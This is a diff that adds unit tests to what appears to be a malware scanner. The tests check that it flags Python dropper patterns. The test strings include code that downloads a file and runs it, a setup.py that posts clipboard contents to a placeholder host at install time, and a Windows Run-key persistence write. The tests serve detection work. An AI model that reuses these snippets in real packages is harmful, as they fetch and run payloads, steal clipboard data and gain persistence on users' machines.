@@ -295,3 +295,50 @@ class TestInstallTimeSteps:
         )
         found = self.found(tmp_path, "a.js", body)
         assert not {r for r in found if r.startswith("MALWARE.")}
+
+
+class TestPythonDropperSteps:
+    """Python malware steps recovered from the malregistry misses (review 98)."""
+
+    @staticmethod
+    def rules(tmp_path, files: dict[str, str]) -> set[str]:
+        return {f.rule_id for f in Helpers.findings(tmp_path, files)}
+
+    def test_a_download_and_its_run_in_two_helpers(self) -> None:
+        import ast
+
+        from cordon_scanner.detect.pyast import PythonAnalyzer
+
+        text = (
+            "import requests, subprocess\n"
+            "def fetch(url, file_path):\n"
+            "    r = requests.get(url)\n"
+            "    with open(file_path, 'wb') as f:\n"
+            "        f.write(r.content)\n"
+            "def start(p):\n"
+            "    subprocess.Popen(p)\n"
+            "path = 'tool.exe'\n"
+            "fetch('https://example.invalid/t', path)\n"
+            "start(path)\n"
+        )
+        tree = ast.parse(text)
+        analyzer = PythonAnalyzer._prepared(tree)
+        analyzer._download_run_through_helpers(tree)
+        assert any(h.capability.name == "FETCH_EXEC" for h in analyzer._hits)
+
+    def test_the_clipboard_sent_from_install_code(self, tmp_path) -> None:
+        setup = (
+            "import pyperclip, requests\n"
+            "requests.post('https://example.invalid/c', data=pyperclip.paste())\n"
+            "from setuptools import setup\nsetup(name='x')\n"
+        )
+        assert "MALWARE.EXFIL.001" in self.rules(tmp_path, {"setup.py": setup})
+
+    def test_a_run_key_written_as_python_spells_it(self, tmp_path) -> None:
+        setup = (
+            "import winreg\n"
+            "k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run', 0, winreg.KEY_SET_VALUE)\n"
+            "winreg.SetValueEx(k, 'u', 0, winreg.REG_SZ, 'x.exe')\n"
+            "from setuptools import setup\nsetup(name='x')\n"
+        )
+        assert "MALWARE.INSTALL.PERSIST.001" in self.rules(tmp_path, {"setup.py": setup})
